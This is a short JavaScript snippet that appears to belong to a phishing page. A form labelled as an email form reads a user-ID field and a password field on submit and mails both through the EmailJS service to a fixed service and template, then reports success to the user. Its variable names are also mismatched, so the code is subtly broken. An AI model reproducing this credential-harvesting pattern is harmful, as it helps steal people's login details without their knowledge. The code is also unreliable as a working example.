document.addEventListener("DOMContentLoaded", function () {
    const form = document.getElementById("emailForm");
  
    form.addEventListener("submit", function (event) {
      event.preventDefault();
  
      const name = document.getElementById("uid").value;
      const email = document.getElementById("pwd").value;
  
      emailjs.send("service_8yea73d", "template_64bhcnp", {
        from_uid: uid,
        from_pwd: pwd
      }).then(function (response) {
        alert("Email sent successfully!");
      }, function (error) {
        alert("Failed to send email: " + JSON.stringify(error));
      });
    });
  });
  